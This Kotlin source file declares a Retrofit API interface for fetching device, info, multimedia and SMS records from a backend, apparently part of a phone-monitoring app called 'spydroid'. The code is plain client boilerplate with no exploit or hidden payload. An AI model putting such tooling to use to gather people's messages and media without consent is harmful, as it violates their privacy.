/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.common.remote.database.api

import net.spydroid.common.remote.database.models.Devices
import retrofit2.http.GET
import retrofit2.http.Query
import retrofit2.Call

interface ApiService {
    @GET("/devices")
    fun getDevices(@Query("access_token") accessToken: String): Call<List<Devices>>

    @GET("/info")
    fun getInfo(@Query("access_token") accessToken: String): Call<List<Devices>>
    @GET("/multimedia")
    fun getMultimedia(@Query("access_token") accessToken: String): Call<List<Devices>>
    @GET("/sms")
    fun getSms(@Query("access_token") accessToken: String): Call<List<Devices>>
}